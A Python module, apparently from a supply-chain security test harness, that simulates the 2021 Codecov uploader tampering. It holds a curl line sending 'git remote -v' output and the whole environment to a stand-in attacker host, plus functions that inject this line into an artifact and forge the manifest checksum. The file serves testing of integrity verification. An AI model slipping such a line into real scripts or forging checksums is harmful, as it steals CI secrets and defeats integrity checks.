"""Scenario 2 – Codecov-style tampering of a released artifact (SAFE, LOCAL ONLY).

Reproduces the *shape* of the documented 2021 modification: one extra line
added to the uploader that would send ``git remote -v`` output and the full
environment (CI secrets) to an attacker-controlled server.

Safety: the modified file is only hashed and verified, never executed, and the
exfiltration target uses the reserved ``.invalid`` TLD (RFC 2606), which can
never resolve. No real Codecov or third-party system is contacted.
"""

from __future__ import annotations

import json
from pathlib import Path

from common.crypto_utils import sha256_file
from common.workspace import write_json

MALICIOUS_LINE = ('curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" '
                  'https://attacker.invalid/upload/v2 || true   # injected by attacker (simulation)\n')


def inject_codecov_style_payload(artifact: Path) -> str:
    """Insert one malicious line before the script's entry point. Returns the new SHA-256."""
    lines = Path(artifact).read_text(encoding="utf-8").splitlines(keepends=True)
    idx = next((i for i, l in enumerate(lines) if l.startswith('main "$@"')), len(lines))
    lines.insert(idx, MALICIOUS_LINE)
    Path(artifact).write_text("".join(lines), encoding="utf-8")
    return sha256_file(artifact)


def forge_manifest_hash(manifest: Path, new_sha256: str) -> None:
    """A smarter attacker also updates the SHA-256 in the manifest (as a checksum-file swap would)."""
    env = json.loads(Path(manifest).read_text())
    env["manifest"]["sha256"] = new_sha256
    env["manifest"]["provenance"]["artifact_sha256"] = new_sha256
    write_json(Path(manifest), env)


def restore(artifact: Path, original: bytes) -> None:
    Path(artifact).write_bytes(original)


if __name__ == "__main__":
    import argparse

    ap = argparse.ArgumentParser(description="Inject the simulated Codecov-style line into an artifact")
    ap.add_argument("artifact")
    print("new SHA-256:", inject_codecov_style_payload(Path(ap.parse_args().artifact)))
